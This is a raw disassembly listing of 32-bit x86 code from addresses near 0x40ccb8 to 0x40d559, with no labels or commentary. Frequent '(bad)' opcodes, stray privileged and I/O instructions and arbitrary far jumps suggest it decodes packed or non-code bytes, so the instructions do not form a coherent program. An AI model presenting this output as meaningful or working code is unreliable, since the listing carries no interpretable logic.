  40ccb8:	ret    
  40ccb9:	data16 fadd DWORD PTR [edx]
  40ccbc:	cmp    DWORD PTR [ebp+0x3d],eax
  40ccbf:	inc    DWORD PTR ds:0xc0cd492b
  40ccc5:	adc    BYTE PTR [ecx],bl
  40ccc7:	(bad)  
  40ccc8:	xor    eax,esp
  40ccca:	test   DWORD PTR [ebp+0x0],0xfee9eee8
  40ccd1:	inc    DWORD PTR [eax+0x148df841]
  40ccd7:	(bad)  
  40ccd8:	dec    esi
  40ccd9:	call   0x3fbc0b
  40ccde:	dec    esi
  40ccdf:	lock adc edi,edi
  40cce2:	mov    ah,0x8
  40cce4:	push   DWORD PTR [ebp+0x51]
  40cce7:	(bad)  
  40cce8:	jae    0x40ccf2
  40ccea:	xor    DWORD PTR [esi+eiz*2],ebp
  40cced:	inc    DWORD PTR [eax]
	...
  40ccff:	add    BYTE PTR [esi],ch
  40cd01:	or     al,al
  40cd03:	cmovne ebp,DWORD PTR ds:0xc799ffff
  40cd0a:	jae    0x40cd18
  40cd0c:	fsubp  st(7),st
  40cd0e:	idiv   edi
  40cd10:	fs js  0x40ccf9
  40cd13:	stc    
  40cd14:	fs (bad) 
  40cd16:	std    
  40cd17:	mov    edx,DWORD PTR [eax+ecx*1+0x3b]
  40cd1b:	inc    ebp
  40cd1c:	lock mov ebp,0xae54830f
  40cd22:	add    al,BYTE PTR [eax]
  40cd24:	ja     0x40cd61
  40cd26:	pop    ss
  40cd27:	jmp    ebp
  40cd29:	mov    ch,0xaa
  40cd2b:	mov    eax,ds:0x88bfb0cf
  40cd30:	mov    ch,0xb1
  40cd32:	stos   DWORD PTR es:[edi],eax
  40cd33:	jae    0x40cd8c
  40cd35:	repz mov bh,0x2a
  40cd38:	and    dh,BYTE PTR ds:0xb3ff446
  40cd3e:	enter  0xb165,0xad
  40cd42:	or     edx,edx
  40cd44:	mov    esp,0x9a67abab
  40cd49:	lods   eax,DWORD PTR ds:[esi]
  40cd4a:	push   edx
  40cd4b:	call   FWORD PTR [ebp-0x6b77555b]
  40cd51:	push   0xb99dfebf
  40cd56:	mov    edi,0x3395f874
  40cd5b:	addr16 pop es
  40cd5d:	xchg   ecx,eax
  40cd5e:	mov    edx,DWORD PTR [esp+eiz*8+0x2c]
  40cd62:	std    
  40cd63:	inc    DWORD PTR [eax]
	...
  40cd75:	add    BYTE PTR [ebx+ebp*4-0x55],bh
  40cd79:	inc    edi
  40cd7a:	jns    0x40cd5e
  40cd7c:	mov    bh,0x8a
  40cd7e:	cmc    
  40cd7f:	imul   ebp,DWORD PTR [eax],0xaa2cf041
  40cd85:	add    eax,DWORD PTR [ecx+0x21]
  40cd88:	ss adc al,0x21
  40cd8b:	pop    ecx
  40cd8c:	ss clc 
  40cd8e:	(bad)  
  40cd8f:	fimul  DWORD PTR [edx]
  40cd91:	call   0xff008ead
  40cd96:	sbb    DWORD PTR [ebp+0x54f274c2],esi
  40cd9c:	out    0x50,al
  40cd9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd9f:	jp     0x40cd5b
  40cda1:	(bad)  
  40cda2:	and    eax,0xd79aaea
  40cda7:	pop    es
  40cda8:	ror    BYTE PTR es:[esi+0x3ab1d31],0x23
  40cdb0:	push   ss
  40cdb1:	sar    BYTE PTR [esi+eax*1+0x30ee43e9],0xeb
  40cdb9:	lods   al,BYTE PTR ds:[esi]
  40cdba:	test   DWORD PTR [ebx+0x3267b77b],0xb807ac6f
  40cdc4:	jae    0x40cd85
  40cdc6:	dec    edi
  40cdc7:	add    al,0x4d
  40cdc9:	mov    edi,0xc023bf4e
  40cdce:	inc    edi
  40cdcf:	mov    bh,0xe8
  40cdd1:	add    ebp,DWORD PTR [ebx+0x41]
  40cdd4:	cmc    
  40cdd5:	(bad)  
  40cdd6:	aaa    
  40cdd7:	mov    bh,0xe8
  40cdd9:	add    eax,DWORD PTR [eax]
	...
  40cdeb:	add    al,dh
  40cded:	mov    bh,0x33
  40cdef:	mov    esp,0xbf45390f
  40cdf4:	push   ds
  40cdf5:	mov    esp,DWORD PTR [ebx]
  40cdf7:	shr    BYTE PTR [eax],0xc4
  40cdfa:	clc    
  40cdfb:	add    esp,DWORD PTR [ebp+0x7b578c8b]
  40ce01:	inc    ecx
  40ce02:	in     eax,0x82
  40ce04:	aas    
  40ce05:	push   cs
  40ce06:	cmp    DWORD PTR [esp+esi*2+0x7abf862a],ebp
  40ce0d:	scas   eax,DWORD PTR es:[edi]
  40ce0e:	jge    0x40ce49
  40ce10:	hlt    
  40ce11:	test   ebp,ebp
  40ce13:	mov    esi,0x475e1764
  40ce18:	in     al,dx
  40ce19:	mov    ebx,esp
  40ce1b:	(bad)  
  40ce1d:	cmp    ch,dh
  40ce1f:	mov    esi,0x4764033c
  40ce24:	call   0xe87a1c7f
  40ce29:	sahf   
  40ce2a:	pop    edx
  40ce2b:	xor    BYTE PTR [edi-0x3b68e4a],ch
  40ce31:	jg     0x40ce32
  40ce33:	lock sbb eax,DWORD PTR [edi]
  40ce36:	add    cl,ch
  40ce38:	repz push ebp
  40ce3a:	leave  
  40ce3b:	sub    esp,esp
  40ce3d:	push   es
  40ce3e:	push   ebp
  40ce3f:	jb     0x40ce81
  40ce41:	mov    ebx,eax
  40ce43:	sbb    eax,0x26145b6b
  40ce48:	repnz push es
  40ce4a:	add    cl,ch
  40ce4c:	repz loope 0x40ce20
  40ce4f:	test   BYTE PTR [eax],0x0
	...
  40ce62:	mov    eax,0xf3e90102
  40ce67:	push   es
  40ce68:	andnps xmm6,XMMWORD PTR [edx]
  40ce6b:	mov    DWORD PTR [ebp+esi*8-0xd],edi
  40ce6f:	cmp    edx,DWORD PTR [ebx]
  40ce71:	fimul  WORD PTR [eax]
  40ce73:	sbb    ebp,DWORD PTR [edx-0x16]
  40ce76:	or     DWORD PTR [edi],eax
  40ce78:	push   0xffffffe9
  40ce7a:	mov    eax,DWORD PTR [esi-0x60913902]
  40ce80:	sub    bl,ch
  40ce82:	repz push es
  40ce84:	xor    DWORD PTR [eax+eax*1],0x8
  40ce88:	jne    0x40ce94
  40ce8a:	push   edi
  40ce8b:	cmp    edx,DWORD PTR [eax]
  40ce8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce8e:	enter  0xe7fe,0xac
  40ce92:	int    0xb5
  40ce94:	(bad)  
  40ce95:	pusha  
  40ce96:	test   al,0xb2
  40ce98:	(bad)  
  40ce99:	adc    al,0xd8
  40ce9b:	and    BYTE PTR [eax],al
  40ce9d:	adc    edi,eax
  40ce9f:	add    DWORD PTR [ebp+edi*2+0x43],0xffffff9f
  40cea4:	data16 jbe 0x40ce45
  40cea7:	mov    ah,0xe8
  40cea9:	jmp    0x6a40d59f
  40ceae:	xor    BYTE PTR [ebx],al
  40ceb0:	add    dl,ah
  40ceb2:	shl    BYTE PTR [esp+esi*2+0x83a7ef9],cl
  40ceb9:	inc    ecx
  40ceba:	(bad)  
  40cebb:	sub    al,0xff
  40cebd:	add    BYTE PTR [esi],dh
  40cebf:	add    DWORD PTR [ebx-0x4],0xffffffe6
  40cec3:	out    dx,al
  40cec4:	adc    ebp,DWORD PTR [edx+0x0]
	...
  40ced7:	add    BYTE PTR [ecx+0x4c8d03df],cl
  40cedd:	jne    0x40cf2d
  40cedf:	call   0x3e437b
  40cee4:	loopne 0x40cec2
  40cee6:	(bad)  
  40cee7:	dec    DWORD PTR [ecx-0x75f38478]
  40ceed:	out    dx,al
  40ceee:	pop    ds
  40ceef:	(bad)  
  40cef0:	in     al,dx
  40cef1:	sbb    DWORD PTR [edx+0x3],ebp
  40cef4:	data16 std 
  40cef6:	pop    es
  40cef7:	call   0x3fbaa9
  40cefc:	inc    esi
  40cefd:	std    
  40cefe:	adc    ebp,DWORD PTR [edx+0x5a]
  40cf01:	(bad)  
  40cf03:	imul   ebx,DWORD PTR [ecx+0x61],0x7326ff16
  40cf0a:	out    0xb1,eax
  40cf0c:	dec    eax
  40cf0d:	or     DWORD PTR [eax],eax
  40cf0f:	xor    DWORD PTR [esi+edx*1+0x73fa7504],0x73
  40cf17:	adc    BYTE PTR [esi-0x3],ah
  40cf1a:	pop    es
  40cf1b:	call   0x3fbc65
  40cf20:	or     BYTE PTR [ebp-0x4],0xff
  40cf24:	fmul   QWORD PTR [esi]
  40cf26:	push   0x0
  40cf28:	repz dec BYTE PTR [ebp+eax*2-0x1017a59b]
  40cf30:	ja     0x40cfa4
  40cf32:	std    
  40cf33:	jmp    0x40d799
  40cf38:	dec    edx
  40cf39:	hlt    
  40cf3a:	or     eax,DWORD PTR ds:0x0
	...
  40cf4c:	add    BYTE PTR [eax],al
  40cf4e:	fcomp  QWORD PTR [ebx]
  40cf50:	push   DWORD PTR [ebp-0x37]
  40cf53:	fiadd  WORD PTR ds:0xe8009cff
  40cf59:	push   ebp
  40cf5a:	lock ret 
  40cf5c:	mov    ebx,0x29f78fe
  40cf61:	add    al,dh
  40cf63:	push   esi
  40cf64:	sub    DWORD PTR [ecx],eax
  40cf66:	lock popf 
  40cf68:	jg     0x40cfe6
  40cf6a:	in     al,dx
  40cf6b:	mov    ds:0x7b972035,eax
  40cf70:	adc    ch,BYTE PTR [edx-0x8]
  40cf73:	in     al,dx
  40cf74:	or     BYTE PTR ss:[eax+0x7fff24a6],bl
  40cf7b:	sbb    eax,0xa10a1437
  40cf80:	sub    BYTE PTR [eax],al
  40cf82:	ficomp DWORD PTR [ebp-0x4a995456]
  40cf88:	mov    ebx,0x29eb5e8
  40cf8d:	add    BYTE PTR [ebx+0x23],dh
  40cf90:	sysret 
  40cf92:	(bad)  
  40cf95:	je     0x40cf77
  40cf97:	push   edi
  40cf98:	or     al,0xff
  40cf9a:	lds    esp,FWORD PTR [ebp-0x3b31ee56]
  40cfa0:	mov    ebx,0x28d1a5fe
  40cfa5:	add    ebx,DWORD PTR [edx+0x800289d]
  40cfab:	and    al,0xbd
  40cfad:	(bad)  
  40cfae:	pop    ss
  40cfaf:	(bad)  
  40cfb0:	sbb    eax,DWORD PTR [ecx]
	...
  40cfc2:	add    BYTE PTR [eax],al
  40cfc4:	lock popf 
  40cfc6:	jg     0x40d044
  40cfc8:	hlt    
  40cfc9:	mov    ch,0x35
  40cfcb:	sbb    al,0x37
  40cfcd:	jecxz  0x40cf8e
  40cfcf:	push   edi
  40cfd1:	popf   
  40cfd2:	add    bh,bh
  40cfd4:	shr    BYTE PTR gs:[eax],cl
  40cfd7:	add    BYTE PTR [edx-0x56],bl
  40cfda:	lea    eax,[esp+ebx*8+0xd]
  40cfde:	lods   al,BYTE PTR ds:[esi]
  40cfdf:	arpl   si,dx
  40cfe1:	and    al,0xbc
  40cfe3:	call   0x429d6b5
  40cfe8:	lock xchg ebx,ebx
  40cfeb:	psubsw mm7,QWORD PTR [ecx]
  40cfee:	cmc    
  40cfef:	les    ebp,FWORD PTR [ebx+esi*4]
  40cff2:	out    0x3,eax
  40cff4:	lock push es
  40cff6:	inc    esi
  40cff7:	ss cld 
  40cff9:	and    cl,ch
  40cffb:	sub    esp,esi
  40cffd:	sub    DWORD PTR [ebx-0x5560d841],0xfb38ebd
  40d007:	fadd   DWORD PTR [edi-0x37f174d]
  40d00d:	add    ah,bl
  40d00f:	ss jmp 0x1006:0xf003e86e
  40d017:	enter  0xb367,0xe8
  40d01b:	sbb    ah,0x2
  40d01e:	loop   0x40d056
  40d020:	jmp    0xd006:0xf003e86e
  40d027:	jg     0x40d029
	...
  40d039:	add    BYTE PTR [edi-0x4d],al
  40d03c:	call   0xe5438cc7
  40d041:	xor    eax,0x30baff9d
  40d046:	rol    DWORD PTR [ebp+0x6f00843],0x29
  40d04d:	add    ah,BYTE PTR [ebx-0x1bce49c2]
  40d053:	and    DWORD PTR [ebx],0xffffffb0
  40d056:	jb     0x40d079
  40d058:	popf   
  40d059:	or     BYTE PTR [ecx],ah
  40d05b:	and    DWORD PTR [ebp-0x7f457b45],edx
  40d061:	xchg   BYTE PTR [ecx+0x348d8db3],cl
  40d067:	scas   eax,DWORD PTR es:[edi]
  40d068:	test   DWORD PTR [ecx],esi
  40d06a:	add    BYTE PTR [edx+0x3cdeaff3],dh
  40d070:	add    BYTE PTR [ecx-0x65],dh
  40d073:	cmp    ecx,DWORD PTR [eax]
  40d075:	add    DWORD PTR [ecx+0x26],0x3b8b66ff
  40d07c:	adc    al,0xd3
  40d07e:	cmc    
  40d07f:	mov    cl,0x74
  40d081:	pop    ebp
  40d082:	jnp    0x40d0bf
  40d084:	clc    
  40d085:	inc    ecx
  40d086:	lds    esi,FWORD PTR [ebx+0x3b6b46fe]
  40d08c:	clc    
  40d08d:	push   ecx
  40d08e:	fwait
  40d08f:	and    bh,bh
  40d091:	ss adc al,0x7
  40d094:	add    cl,ch
  40d096:	repz popf 
  40d098:	pop    edi
  40d099:	push   0xffffffc9
  40d09b:	add    cl,BYTE PTR ds:0x9b
	...
  40d0ad:	add    BYTE PTR [eax],al
  40d0af:	add    BYTE PTR [eax],ah
  40d0b1:	(bad)  
  40d0b2:	rcr    DWORD PTR [esp+ebx*1-0xc228378],1
  40d0b9:	push   es
  40d0ba:	inc    eax
  40d0bb:	out    dx,eax
  40d0bc:	push   ds
  40d0bd:	aas    
  40d0be:	push   DWORD PTR [edi+esi*8-0x7f]
  40d0c2:	inc    esp
  40d0c3:	std    
  40d0c4:	outs   dx,BYTE PTR ds:[esi]
  40d0c5:	and    esi,esp
  40d0c7:	fsub   QWORD PTR [ebx+eiz*1]
  40d0ca:	hlt    
  40d0cb:	out    0x0,al
  40d0cd:	mov    ebx,0xb20e06e7
  40d0d2:	(bad)  
  40d0d3:	pusha  
  40d0d4:	mov    al,0xae
  40d0d6:	(bad)  
  40d0d7:	push   esp
  40d0d8:	add    al,0xb2
  40d0da:	je     0x40d099
  40d0dc:	push   0x3b
  40d0de:	clc    
  40d0df:	mov    esi,0x13e7fee0
  40d0e4:	shl    BYTE PTR [ecx+0x1ac0aefe],1
  40d0ea:	push   0xffffffe8
  40d0ec:	dec    edx
  40d0ed:	cmp    esi,esp
  40d0ef:	sahf   
  40d0f0:	shr    BYTE PTR [esi-0x4ec6e019],0xfe
  40d0f7:	mov    fs,WORD PTR [eax]
  40d0f9:	scas   eax,DWORD PTR es:[edi]
  40d0fa:	out    0x0,eax
  40d0fc:	jne    0x40d0e0
  40d0fe:	(bad)  
  40d0ff:	push   DWORD PTR [ecx]
  40d101:	or     eax,DWORD PTR [eax]
  40d103:	add    cl,cl
  40d105:	pusha  
  40d106:	add    edi,DWORD PTR [eax+0x5d9]
  40d10c:	add    ah,cl
  40d10e:	push   cs
  40d10f:	add    BYTE PTR [eax+eax*4+0x56ea],al
	...
  40d126:	dec    edx
  40d127:	out    dx,eax
  40d128:	pop    es
  40d129:	add    ah,al
  40d12b:	push   es
  40d12c:	pop    esi
  40d12d:	leave  
  40d12e:	(bad)  [ecx-0x29b7502]
  40d134:	jmp    0xb0b9:0xe6b7de0a
  40d13b:	ins    BYTE PTR es:[edi],dx
  40d13c:	std    
  40d13d:	adc    edi,0xffffffb1
  40d140:	cmp    DWORD PTR [esi],0xfff0f689
  40d146:	push   esp
  40d147:	std    
  40d148:	out    0xa9,eax
  40d14a:	jo     0x40d1b8
  40d14c:	std    
  40d14d:	pop    esi
  40d14e:	and    ah,cl
  40d150:	add    al,BYTE PTR [eax]
  40d152:	test   BYTE PTR [eax-0x27b7416],al
  40d158:	mov    dl,BYTE PTR [ebp+0x2d]
  40d15b:	add    BYTE PTR [edx],0x90
  40d15e:	(bad)  
  40d160:	verr   WORD PTR [ebp+0x39558b07]
  40d167:	outs   dx,BYTE PTR ds:[esi]
  40d168:	cs (bad) 
  40d16a:	sbb    ecx,DWORD PTR [edx-0x1ee6eb85]
  40d170:	pop    es
  40d171:	mov    eax,DWORD PTR [edi+edx*1]
  40d174:	push   DWORD PTR [eax+0x5]
  40d177:	jle    0x40d179
  40d179:	sbb    esp,0x12
  40d17c:	add    BYTE PTR [eax+eax*1-0x7e],dh
  40d180:	push   ebx
  40d181:	sbb    BYTE PTR [ecx-0xf7cff81],bh
  40d187:	popf   
  40d188:	or     cl,cl
	...
  40d19a:	add    BYTE PTR [eax],al
  40d19c:	mov    dl,0xba
  40d19e:	add    dl,BYTE PTR [ebp+0x7b]
  40d1a1:	call   0x8b52:0x19bcc384
  40d1a8:	sub    eax,0xcfffbfce
  40d1ad:	sahf   
  40d1ae:	add    al,BYTE PTR [eax]
  40d1b0:	jnp    0x40d215
  40d1b2:	push   es
  40d1b3:	(bad)  
  40d1b4:	lock popf 
  40d1b6:	add    al,BYTE PTR [eax]
  40d1b8:	lock sbb al,0x37
  40d1bb:	or     al,dh
  40d1bd:	fimul  DWORD PTR [edx]
  40d1bf:	sub    esi,DWORD PTR [eax-0x4d36a898]
  40d1c5:	mov    ds:0xa61dff02,al
  40d1ca:	stos   BYTE PTR es:[edi],al
  40d1cb:	call   DWORD PTR [eax]
  40d1cd:	loope  0x40d187
  40d1cf:	or     dh,BYTE PTR [eax-0x4fd4f56d]
  40d1d5:	jo     0x40d22e
  40d1d7:	leave  
  40d1d8:	mov    dl,0xaa
  40d1da:	add    cl,BYTE PTR [ecx+0x74b915b5]
  40d1e0:	clc    
  40d1e1:	adc    eax,0xb15f630e
  40d1e6:	mov    edi,0x29f5c44
  40d1eb:	add    al,dh
  40d1ed:	push   edx
  40d1ee:	aas    
  40d1ef:	in     al,dx
  40d1f0:	mov    al,ds:0xa0f43e3a
  40d1f5:	shr    BYTE PTR ds:0xbc714808,1
  40d1fb:	(bad)  
  40d1fc:	das    
  40d1fd:	pop    ss
  40d1fe:	aas    
  40d1ff:	in     al,dx
	...
  40d210:	add    BYTE PTR [eax],al
  40d212:	lahf   
  40d213:	mov    bl,0x83
  40d215:	jl     0x40d23b
  40d217:	sahf   
  40d218:	cs add al,0xeb
  40d21b:	mov    ebp,DWORD PTR [esi]
  40d21d:	or     bl,bl
  40d21f:	pop    ebp
  40d220:	pop    eax
  40d221:	pop    edi
  40d222:	cmp    DWORD PTR [edi],eax
  40d224:	stos   DWORD PTR es:[edi],eax
  40d225:	pop    es
  40d226:	lock (bad) [ebx]
  40d229:	test   al,0x68
  40d22b:	dec    edx
  40d22c:	add    DWORD PTR [edx+0x3e89f6c],0xbff0690
  40d236:	or     eax,edi
  40d238:	push   ds
  40d239:	pop    ecx
  40d23a:	test   eax,0x7b03e4c4
  40d23f:	dec    ecx
  40d240:	add    edx,0xabb904a7
  40d246:	enter  0x5e1e,0xb8
  40d24a:	push   0xa78c5549
  40d24f:	(bad)  
  40d250:	mov    ds:0xe8afa79f,eax
  40d255:	add    ecx,DWORD PTR [ebx-0x5fc1940d]
  40d25b:	push   esi
  40d25c:	fs test BYTE PTR ds:[esi+0x2e],dl
  40d261:	cs clc 
  40d263:	sahf   
  40d264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d265:	mov    ebp,0x4671af7e
  40d26a:	sub    bl,0xa3
  40d26d:	stos   DWORD PTR es:[edi],eax
  40d26e:	out    0xa,al
  40d270:	loop   0x40d247
  40d272:	jecxz  0x40d28a
  40d274:	push   es
  40d275:	add    BYTE PTR cs:[eax],al
	...
  40d288:	pop    esp
  40d289:	sahf   
  40d28a:	dec    eax
  40d28b:	sub    edx,DWORD PTR [edi-0x51]
  40d28e:	rol    ebx,0xad
  40d291:	dec    edi
  40d292:	and    ch,al
  40d294:	sti    
  40d295:	push   es
  40d296:	adc    BYTE PTR [ecx+0x48],cl
  40d299:	scas   eax,DWORD PTR es:[edi]
  40d29a:	and    esp,DWORD PTR [eax-0x53ac7c76]
  40d2a0:	das    
  40d2a1:	cmp    edi,esp
  40d2a3:	and    BYTE PTR [edx+edi*4-0x7ccecf18],0x3b
  40d2ab:	lods   al,BYTE PTR ds:[esi]
  40d2ac:	pop    ss
  40d2ad:	cmp    al,BYTE PTR [eax]
  40d2af:	out    dx,eax
  40d2b0:	jb     0x40d2e4
  40d2b2:	hlt    
  40d2b3:	jmp    0x1d3fe978
  40d2b8:	cmp    BYTE PTR [edi-0x4fc0ee90],ah
  40d2be:	sub    ch,BYTE PTR [ecx-0x5436b1ba]
  40d2c4:	clc    
  40d2c5:	push   es
  40d2c6:	add    DWORD PTR [eax+edx*4],0xffffffae
  40d2ca:	jae    0x40d2b0
  40d2cc:	test   BYTE PTR [ecx-0x7e0c1701],al
  40d2d2:	inc    esp
  40d2d3:	fnstcw WORD PTR [esi+0x33]
  40d2d6:	in     al,0x76
  40d2d8:	hlt    
  40d2d9:	add    DWORD PTR [ebp+eax*2-0x53],0x5bb901ce
  40d2e1:	daa    
  40d2e2:	push   0x447f5f4e
  40d2e7:	and    eax,0x72dc2b6b
	...
  40d2fc:	add    BYTE PTR [eax],al
  40d2fe:	loope  0x40d2aa
  40d300:	jmp    0x3126:0xcf811891
  40d307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d308:	(bad)  
  40d309:	call   0xa4cdda01
  40d30e:	push   ebx
  40d30f:	lea    ebp,ds:[edi+ebx*4+0x210e523e]
  40d317:	jmp    edi
  40d319:	push   ss
  40d31a:	fwait
  40d31b:	lods   eax,DWORD PTR ds:[esi]
  40d31c:	(bad)  
  40d31d:	repnz xor edi,DWORD PTR [edx]
  40d320:	or     al,0x6a
  40d322:	or     DWORD PTR [ebx-0x76ba8b01],esi
  40d328:	jl     0x40d2f3
  40d32a:	repz xor esp,DWORD PTR [esi]
  40d32d:	push   0xfffffff8
  40d32f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d330:	call   FWORD PTR [esp+edi*8-0x53]
  40d334:	je     0x40d2ff
  40d336:	pop    ebx
  40d337:	add    al,0x68
  40d339:	add    BYTE PTR [esi],dh
  40d33b:	jne    0x40d33a
  40d33d:	jne    0x40d3b4
  40d33f:	bound  ebp,QWORD PTR [eax]
  40d341:	inc    BYTE PTR [esi+0x75]
  40d344:	std    
  40d345:	jne    0x40d39c
  40d347:	(bad)  
  40d348:	hlt    
  40d349:	addr16 push esi
  40d34b:	jne    0x40d376
  40d34d:	shl    BYTE PTR [edi-0x2a3d36ab],0x9
  40d354:	mov    eax,DWORD PTR [ebp+0x79]
  40d357:	and    dh,bh
  40d359:	dec    ebp
  40d35a:	ins    DWORD PTR es:[edi],dx
  40d35b:	mov    BYTE PTR [ebx-0x1c],bh
  40d35e:	leave  
  40d35f:	fld    QWORD PTR ds:0x83
	...
  40d371:	add    BYTE PTR [eax],al
  40d373:	add    ah,al
  40d375:	pop    ebp
  40d376:	(bad)  
  40d377:	je     0x40d3ae
  40d379:	add    DWORD PTR [ebx+0xc],0x8fdbf756
  40d380:	leave  
  40d381:	je     0x40d3f6
  40d383:	cld    
  40d384:	xor    ecx,eax
  40d386:	push   DWORD PTR gs:[esi]
  40d389:	xor    al,BYTE PTR [eax]
  40d38b:	add    BYTE PTR [ecx-0x1fa0a1f7],cl
  40d391:	(bad)  
  40d392:	or     al,BYTE PTR [eax]
  40d394:	ins    BYTE PTR es:[edi],dx
  40d395:	sub    dl,0x83
  40d398:	int    0xc1
  40d39a:	push   ebp
  40d39b:	adc    DWORD PTR [ecx+ebx*1+0x0],0x75
  40d3a0:	xor    DWORD PTR [ecx],0x0
  40d3a3:	add    BYTE PTR [ecx+0x9],bl
  40d3a6:	pop    edi
  40d3a7:	leave  
  40d3a8:	sbb    edi,esi
  40d3aa:	(bad)  
  40d3ab:	(bad)  
  40d3ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3ad:	sbb    DWORD PTR [ebx],ebp
  40d3af:	shl    dl,cl
  40d3b1:	inc    esi
  40d3b2:	adc    bh,dh
  40d3b4:	cmp    al,0x6d
  40d3b6:	fs inc ecx
  40d3b8:	pop    ecx
  40d3b9:	jp     0x40d3fe
  40d3bb:	lock mov ds:0x1975ff02,eax
  40d3c1:	jae    0x40d436
  40d3c3:	or     al,dh
  40d3c5:	(bad)  
  40d3c6:	sbb    DWORD PTR [edi+0x27],ebx
  40d3c9:	mov    esp,0xa0007c80
  40d3ce:	sub    eax,0x289e8a0c
  40d3d3:	pminsw mm1,QWORD PTR fs:[ebx]
  40d3d7:	call   0x40d3dc
	...
  40d3e8:	add    BYTE PTR [eax],al
  40d3ea:	clc    
  40d3eb:	cld    
  40d3ec:	mov    ah,0xfe
  40d3ee:	dec    DWORD PTR [ecx]
  40d3f0:	adc    bh,bh
  40d3f2:	jge    0x40d3ab
  40d3f4:	stos   BYTE PTR es:[edi],al
  40d3f5:	dec    edx
  40d3f6:	push   edx
  40d3f7:	xchg   ebp,eax
  40d3f8:	mov    ah,0x88
  40d3fa:	sub    eax,0x474b47a
  40d3ff:	test   DWORD PTR [esi],ebp
  40d401:	or     al,cl
  40d403:	into   
  40d404:	and    bh,bh
  40d406:	iret   
  40d407:	xor    eax,0xb3c7142f
  40d40c:	or     ch,al
  40d40e:	cmc    
  40d40f:	mov    edi,0x6369feb3
  40d414:	mov    edx,0xb3aa25fe
  40d419:	je     0x40d413
  40d41b:	inc    ebp
  40d41c:	lods   eax,DWORD PTR ds:[esi]
  40d41d:	pusha  
  40d41e:	lahf   
  40d41f:	inc    ebp
  40d420:	mov    ch,0x74
  40d422:	cld    
  40d423:	in     al,dx
  40d424:	or     BYTE PTR cs:[eax-0x7800df29],bl
  40d42b:	sub    DWORD PTR [edi],edi
  40d42d:	adc    al,0x73
  40d42f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d430:	add    dh,BYTE PTR [esp+eiz*8+0x20]
  40d434:	aaa    
  40d435:	cld    
  40d436:	std    
  40d437:	mov    DWORD PTR ds:0xfef9e583,eax
  40d43d:	jae    0x40d436
  40d43f:	fadd   st,st(2)
  40d441:	pop    esi
  40d442:	sub    eax,esp
  40d444:	lldt   WORD PTR [ecx-0xfbee226]
  40d44b:	push   cs
  40d44c:	lods   al,BYTE PTR ds:[esi]
  40d44d:	cmp    BYTE PTR [eax],al
	...
  40d45f:	add    BYTE PTR [ebp-0x10d21efa],dh
  40d465:	fild   QWORD PTR [eax-0x336c6ac]
  40d46b:	add    esi,DWORD PTR [ebx+0x2a]
  40d46e:	int    0xfe
  40d470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d471:	cld    
  40d472:	lds    ebp,FWORD PTR [esi]
  40d474:	cld    
  40d475:	stos   DWORD PTR es:[edi],eax
  40d476:	xor    ecx,DWORD PTR [eax+ebx*1]
  40d479:	xchg   BYTE PTR [edi-0x4b],al
  40d47c:	push   es
  40d47d:	jle    0x40d4a2
  40d47f:	int3   
  40d480:	xchg   edi,eax
  40d481:	push   es
  40d482:	jmp    0xe5dfc489
  40d487:	sbb    al,0xef
  40d489:	stos   DWORD PTR es:[edi],eax
  40d48a:	pop    edi
  40d48b:	ds (bad) 
  40d48e:	lea    ebp,[eax+0xffbac01]
  40d494:	xlat   BYTE PTR ds:[ebx]
  40d495:	xor    ecx,esi
  40d497:	stos   DWORD PTR es:[edi],eax
  40d498:	jge    0x40d4bf
  40d49a:	jbe    0x40d450
  40d49c:	jp     0x40d4ef
  40d49e:	jne    0x40d42a
  40d4a0:	repz jo 0x40d450
  40d4a3:	clc    
  40d4a4:	xor    al,0xaf
  40d4a6:	fisubr DWORD PTR [edx-0x7f02be86]
  40d4ac:	fild   WORD PTR [esi]
  40d4ae:	aam    0x4
  40d4b0:	lahf   
  40d4b1:	xor    DWORD PTR ds:0x3e24b1ab,edi
  40d4b7:	mov    ah,0xda
  40d4b9:	(bad)  
  40d4ba:	xchg   ebp,eax
  40d4bb:	retf   0x12b1
  40d4be:	jmp    0xebebd143
  40d4c3:	add    al,0x0
	...
  40d4d5:	add    BYTE PTR [ebp+0x63],ch
  40d4d8:	call   0x1620c4e0
  40d4dd:	test   al,0xd5
  40d4df:	jg     0x40d494
  40d4e1:	scas   eax,DWORD PTR es:[edi]
  40d4e2:	push   0x2
  40d4e4:	inc    ebx
  40d4e5:	add    BYTE PTR [ebp-0x5ffc6d4a],ch
  40d4eb:	stos   DWORD PTR es:[edi],eax
  40d4ec:	(bad)  
  40d4ed:	jnp    0x40d4ea
  40d4ef:	sahf   
  40d4f0:	daa    
  40d4f1:	pop    DWORD PTR [esp+ebp*4-0x5427a302]
  40d4f8:	je     0x40d4eb
  40d4fa:	mov    edx,DWORD PTR ds:0x7e63d661
  40d500:	inc    esp
  40d501:	popf   
  40d502:	inc    BYTE PTR [esi]
  40d504:	(bad)  
  40d505:	cmp    al,0xf8
  40d507:	stos   DWORD PTR es:[edi],eax
  40d508:	je     0x40d4fb
  40d50a:	imul   edi,DWORD PTR [esi],0xfffffff8
  40d50d:	mov    dh,0x43
  40d50f:	or     BYTE PTR [ebp+edx*8+0x76],0xee
  40d514:	call   FWORD PTR [ebx]
  40d516:	rep stos DWORD PTR es:[edi],eax
  40d518:	je     0x40d4af
  40d51a:	mov    WORD PTR [esi+eiz*2],ds
  40d51d:	xchg   esi,eax
  40d51e:	mov    ds:0x9d2ebfdd,eax
  40d523:	enter  0xe913,0xa2
  40d527:	xor    ebx,DWORD PTR [eax]
  40d529:	jle    0x40d534
  40d52b:	adc    edi,edi
  40d52d:	cld    
  40d52e:	xchg   DWORD PTR [ecx+0x3382dd74],ebp
  40d534:	or     BYTE PTR [ecx+0x5f],dl
  40d537:	lods   al,BYTE PTR ds:[esi]
  40d538:	(bad)  
  40d539:	pop    esi
	...
  40d54a:	add    BYTE PTR [eax],al
  40d54c:	scas   eax,DWORD PTR es:[edi]
  40d54d:	push   0x74
  40d54f:	out    0x62,al
  40d551:	xor    esi,esp
  40d553:	inc    ecx
  40d554:	sub    esp,DWORD PTR [ecx]
  40d556:	inc    DWORD PTR [esi-0x49]
  40d559:	push   0x5e
